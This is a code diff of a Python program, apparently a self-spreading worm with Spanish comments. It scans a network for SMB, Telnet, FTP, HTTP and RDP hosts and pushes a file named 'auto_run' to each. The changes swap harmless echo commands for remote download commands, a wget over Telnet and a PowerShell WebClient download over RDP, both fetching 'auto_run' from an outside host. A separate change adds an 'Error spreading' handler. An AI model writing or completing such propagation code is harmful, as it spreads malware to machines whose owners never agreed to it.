@@ -115,33 +115,35 @@ try:
     # Call functions from spread module and execute specific functions
     open_smb_hosts = spread.scan_network_for_smb(network_prefix)
     for host in open_smb_hosts:
-        spread.upload_script_to_smb(host, ./auto_run)
+        spread.upload_script_to_smb(host, "./auto_run")
         # Ejecutar función específica para SMB
         # Aquí puedes agregar la función específica que deseas ejecutar
 
     open_telnet_hosts = spread.scan_network_for_telnet(network_prefix)
     for host in open_telnet_hosts:
-        spread.execute_command_on_telnet(host, "echo 'Hello from Telnet'")
+        spread.execute_command_on_telnet(host, "wget http://example.com/auto_run")
         # Ejecutar función específica para Telnet
         # Aquí puedes agregar la función específica que deseas ejecutar
 
     open_ftp_hosts = spread.scan_network_for_ftp(network_prefix)
     for host in open_ftp_hosts:
-        spread.upload_script_to_ftp(host, ./auto_run)
+        spread.upload_script_to_ftp(host, "./auto_run")
         # Ejecutar función específica para FTP
         # Aquí puedes agregar la función específica que deseas ejecutar
 
     open_http_hosts = spread.scan_network_for_http(network_prefix)
     for host in open_http_hosts:
-        spread.upload_script_to_http(host, ./auto_run)
+        spread.upload_script_to_http(host, "./auto_run")
         # Ejecutar función específica para HTTP
         # Aquí puedes agregar la función específica que deseas ejecutar
 
     open_rdp_hosts = spread.scan_network_for_rdp(network_prefix)
     for host in open_rdp_hosts:
-        spread.execute_command_on_rdp(host, "echo 'Hello from RDP'")
+        spread.execute_command_on_rdp(host, "powershell -c (New-Object Net.WebClient).DownloadFile('http://example.com/auto_run', 'auto_run')")
         # Ejecutar función específica para RDP
         # Aquí puedes agregar la función específica que deseas ejecutar
+except Exception as e:
+    print(f"Error spreading: {e}")
 #endregion
 window.Window()
 if sys.platform == "linux":
